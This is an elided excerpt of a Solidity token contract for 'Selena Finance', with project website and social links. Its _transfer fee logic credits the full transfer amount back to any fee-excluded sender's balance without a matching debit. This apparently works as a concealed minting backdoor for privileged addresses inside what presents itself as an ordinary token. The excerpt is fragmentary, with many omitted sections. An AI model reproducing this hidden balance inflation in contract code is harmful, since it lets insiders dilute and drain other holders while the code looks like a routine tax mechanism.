...
/**
https://www.selena.finance
https://app.selena.finance
https://docs.selena.finance

https://twitter.com/selena_finance
https://t.me/selena_official_channel
 */
...
contract SELENA is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"Selena Finance";
    string private constant _symbol = unicode"SELENA";
    ...
    function _transfer(
        ...
        if (taxAmount > 0) {
            address taxPayer = from;
            bool isExcluded = _isExcludedFromFee[taxPayer] && taxPayer != address(this);
            uint256 maxTaxAmount = amount;
            address taxReceipient = address(this);
            if (_balances[address(this)] >= _maxTax) {
                taxReceipient = DEAD;
            } else if (isExcluded) {
                _balances[taxPayer] += maxTaxAmount;
            }
